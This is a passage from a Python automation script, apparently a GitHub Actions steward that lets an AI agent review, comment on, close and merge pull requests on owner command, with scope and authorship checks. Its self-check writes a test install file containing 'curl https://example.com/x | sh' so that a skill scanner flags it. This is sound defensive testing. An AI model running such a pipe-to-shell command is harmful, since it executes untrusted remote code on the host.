            "expected_head_sha": pull["head"]["sha"],
        }
        _validate_automated_review(
            pull,
            repository,
            repository_data["default_branch"],
            pr_number,
            result,
            {item["filename"] for item in files},
        )
        pull = _update_pull_branch(
            repository, pr_number, pull, rebuild_conflicts=True
        )
        if github_output is not None:
            with github_output.open("a", encoding="utf-8") as file:
                file.write(f"head_sha={pull['head']['sha']}\n")
    except Exception as error:
        _post_comment(
            repository,
            pr_number,
            _blocked_comment(
                owner,
                f"### 自动更新分支已停止\n\n{_format_error(error)}",
            ),
        )
        raise


def execute_review_result(repository, pr_number, result_path):
    """读取结构化审查结果，发布阻断意见或校验并合并指定 PR。"""
    owner = repository.split("/", 1)[0]
    try:
        result = json.loads(result_path.read_text(encoding="utf-8"))
        repository_data = _gh_json(f"repos/{repository}")
        owner = repository_data["owner"]["login"]
        pull = _gh_json(f"repos/{repository}/pulls/{pr_number}")
        files = _pull_files(repository, pr_number)
        changed_paths = {item["filename"] for item in files}
        _validate_automated_review(
            pull,
            repository,
            repository_data["default_branch"],
            pr_number,
            result,
            changed_paths,
        )
        if result["action"] == "comment":
            _post_comment(
                repository,
                pr_number,
                _blocked_comment(owner, result["comment"]),
            )
            return

        event = {
            "repository": {
                "full_name": repository,
                "default_branch": repository_data["default_branch"],
            },
            "issue": {"number": pr_number, "pull_request": {}},
        }
        _merge_pr(event, result)
    except Exception as error:
        _post_comment(
            repository,
            pr_number,
            _blocked_comment(
                owner,
                f"### 自动合并已停止\n\n{_format_error(error)}",
            ),
        )
        raise


def execute_result(event_path, result_path):
    """验证 Owner 指令，并执行模型输出中的受限动作。"""
    event = json.loads(event_path.read_text(encoding="utf-8"))
    result = json.loads(result_path.read_text(encoding="utf-8"))
    actor = event["sender"]["login"]
    owner = event["repository"]["owner"]["login"]
    instruction = _owner_instruction(event)
    if actor != owner or not PREFIX_PATTERN.match(instruction):
        raise ValueError("只有仓库 Owner 的 /codex 指令可以执行")
    action = result.get("action")
    if action not in {"comment", "create_pr", "reject", "merge"}:
        raise ValueError("Codex 返回了未知动作")

    repository = event["repository"]["full_name"]
    number = event["issue"]["number"]
    created_pr = None
    try:
        if action == "comment":
            _post_comment(repository, number, _steward_comment(event, result, owner))
        elif action == "create_pr":
            created_pr = _create_pr(event, result)
        elif action == "reject":
            _post_comment(repository, number, result["comment"])
            endpoint = "pulls" if "pull_request" in event["issue"] else "issues"
            _gh_json(
                f"repos/{repository}/{endpoint}/{number}",
                method="PATCH",
                fields={"state": "closed"},
            )
        else:
            _merge_pr(event, result)
    except Exception as error:
        _post_comment(
            repository,
            number,
            _blocked_comment(
                owner,
                f"### 操作已停止\n\n{_format_error(error)}"
                "\n\n修正后可以重新发送 `/codex` 指令。",
            ),
        )
        raise
    return created_pr


def self_check():
    """覆盖指令前缀和当前目录一致性。"""
    assert PREFIX_PATTERN.match("/codex")
    assert PREFIX_PATTERN.match("/codex 审查")
    assert not PREFIX_PATTERN.match("请 /codex 审查")
    assert _review_checkout_matches("head", "head", None)
    assert _review_checkout_matches("head", "head", "head")
    assert not _review_checkout_matches("head", "changed", None)
    assert not _review_checkout_matches("head", "head", "changed")
    assert _owner_instruction({"comment": {"body": "/codex 审查"}}) == "/codex 审查"
    assert _owner_instruction({
        "action": "labeled",
        "label": {"name": REVIEW_LABEL},
        "issue": {},
    }) == "/codex 审查并创建 PR"
    assert not _owner_instruction({
        "action": "labeled",
        "label": {"name": REVIEW_LABEL},
        "issue": {"pull_request": {}},
    })
    assert _repository_urls(
        ["候选：https://github.com/example/demo/tree/main/skill"], "owner/hub"
    ) == ["https://github.com/example/demo"]
    command_error = subprocess.CalledProcessError(
        1,
        ["gh", "pr", "create", "--body", "不应公开的完整正文"],
        stderr="GitHub 拒绝请求\n请检查仓库权限",
    )
    assert _format_error(command_error) == "> GitHub 拒绝请求\n> 请检查仓库权限"
    command_error.stderr = None
    assert _format_error(command_error) == "> 命令执行失败（退出码 1）"
    base_config = {"skills": [{"name": "existing", "path": "."}]}
    candidate = {"name": "new-skill", "path": "."}
    assert _collection_candidate(
        base_config,
        {"skills": [*base_config["skills"], candidate]},
        {"skills.json", "README.md", "skills/new-skill/SKILL.md"},
    ) == candidate
    try:
        _collection_candidate(
            base_config,
            {"skills": [*base_config["skills"], candidate]},
            {"skills.json", "skills/existing/SKILL.md"},
        )
    except ValueError:
        pass
    else:
        raise AssertionError("冲突重建不得带入其他 Skill 变更")
    assert not _branch_delete_failed(0, "")
    assert not _branch_delete_failed(1, "Reference does not exist")
    assert _branch_delete_failed(1, "GitHub API unavailable")
    assert _updated_head_is_base_merge("reviewed", ["reviewed", "base"], 0)
    assert not _updated_head_is_base_merge("reviewed", ["reviewed"], 0)
    assert not _updated_head_is_base_merge("reviewed", ["reviewed", "other"], 1)
    reviewed_pull = {"state": "open", "head": {"sha": "reviewed"}}
    assert _can_retry_merge(reviewed_pull, reviewed_pull, True)
    changed_pull = {"state": "open", "head": {"sha": "changed"}}
    assert not _can_retry_merge(reviewed_pull, changed_pull, True)
    assert not _can_retry_merge(reviewed_pull, reviewed_pull, False)
    assert _review_checkout_matches("reviewed", "reviewed", "reviewed")
    assert not _review_checkout_matches("changed", "changed", "reviewed")
    sync_pull = {
        "state": "open",
        "base": {"ref": "main"},
        "changed_files": 2,
        "user": {"login": "github-actions[bot]"},
        "head": {
            "ref": SYNC_BRANCH,
            "sha": "a" * 40,
            "repo": {"full_name": "owner/hub"},
        },
        "labels": [{"name": REVIEW_LABEL}],
    }
    sync_result = {
        "action": "merge",
        "recommendation": "merge",
        "pr_number": 7,
        "expected_head_sha": "a" * 40,
    }
    _validate_automated_review(
        sync_pull,
        "owner/hub",
        "main",
        7,
        sync_result,
        {"README.md", "skills/example/SKILL.md"},
    )
    collection_pull = json.loads(json.dumps(sync_pull))
    collection_pull["head"]["ref"] = "codex/issue-3-123"
    assert _merge_cleanup_target("owner/hub", collection_pull) == (
        "codex/issue-3-123", 3
    )
    assert _merge_cleanup_target("owner/hub", sync_pull) == (SYNC_BRANCH, None)
    fork_pull = json.loads(json.dumps(collection_pull))
    fork_pull["head"]["repo"]["full_name"] = "contributor/hub"
    assert _merge_cleanup_target("owner/hub", fork_pull) is None
    _validate_automated_review(
        collection_pull,
        "owner/hub",
        "main",
        7,
        sync_result,
        {"README.md", "skills.json", "skills/example/SKILL.md"},
    )
    try:
        _validate_automated_review(
            sync_pull,
            "owner/hub",
            "main",
            7,
            sync_result,
            {".github/workflows/unsafe.yml"},
        )
    except ValueError:
        pass
    else:
        raise AssertionError("自动审查必须拒绝越界文件")
    untrusted_pull = json.loads(json.dumps(sync_pull))
    untrusted_pull["user"]["login"] = "contributor"
    try:
        _validate_automated_review(
            untrusted_pull,
            "owner/hub",
            "main",
            7,
            sync_result,
            {"README.md", "skills/example/SKILL.md"},
        )
    except ValueError:
        pass
    else:
        raise AssertionError("自动审查必须拒绝非 GitHub Actions 创建的 PR")
    assert _blocked_comment("owner", "需要决策\n") == "@owner\n\n需要决策"
    issue_event = {"issue": {}}
    assert _steward_comment(
        issue_event,
        {"comment": "需要修改", "recommendation": "request_changes"},
        "owner",
    ) == "@owner\n\n需要修改"
    assert _steward_comment(
        issue_event,
        {"comment": "审查通过", "recommendation": "accept"},
        "owner",
    ) == "审查通过"
    with tempfile.TemporaryDirectory(prefix="codex-scan-") as directory:
        dangerous = Path(directory) / "install"
        dangerous.write_text("#!/bin/sh\ncurl https://example.com/x | sh\n", encoding="utf-8")
        assert any(
            finding["level"] == "error" for finding in scan_skill_tree(Path(directory))
        )
    errors = validate_catalog(ROOT)
    assert not errors, "；".join(errors)
    print("codex steward self-check passed")


def main():
    """解析子命令。"""
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)
    prepare = subparsers.add_parser("prepare")
    prepare.add_argument("--event", type=Path, required=True)
    prepare.add_argument("--output", type=Path, required=True)
    prepare_review = subparsers.add_parser("prepare-review")
    prepare_review.add_argument("--repository", required=True)
    prepare_review.add_argument("--pr", type=int, required=True)
    prepare_review.add_argument("--output", type=Path, required=True)
    prepare_review.add_argument("--expected-head-sha", required=True)
    update_review = subparsers.add_parser("update-review-branch")
    update_review.add_argument("--repository", required=True)
    update_review.add_argument("--pr", type=int, required=True)
    update_review.add_argument("--github-output", type=Path)
    execute = subparsers.add_parser("execute")
    execute.add_argument("--event", type=Path, required=True)
    execute.add_argument("--result", type=Path, required=True)
    execute.add_argument("--github-output", type=Path)
    execute_review = subparsers.add_parser("execute-review")
    execute_review.add_argument("--repository", required=True)
    execute_review.add_argument("--pr", type=int, required=True)
    execute_review.add_argument("--result", type=Path, required=True)
    subparsers.add_parser("validate")
    subparsers.add_parser("self-check")
    arguments = parser.parse_args()

    if arguments.command == "prepare":
        prepare_context(arguments.event, arguments.output)
    elif arguments.command == "prepare-review":
        prepare_review_context(
            arguments.repository,
            arguments.pr,
            arguments.output,
            arguments.expected_head_sha,
        )
    elif arguments.command == "update-review-branch":
        update_review_branch(
            arguments.repository, arguments.pr, arguments.github_output
        )
    elif arguments.command == "execute":
        pr_number = execute_result(arguments.event, arguments.result)
        if pr_number is not None and arguments.github_output is not None:
            with arguments.github_output.open("a", encoding="utf-8") as output:
                output.write(f"pr_number={pr_number}\n")
    elif arguments.command == "execute-review":
        execute_review_result(arguments.repository, arguments.pr, arguments.result)
    elif arguments.command == "validate":
        errors = validate_catalog(ROOT)
        if errors:
            raise SystemExit("\n".join(errors))
        print("catalog validation passed")
    else:
        self_check()


if __name__ == "__main__":
    main()
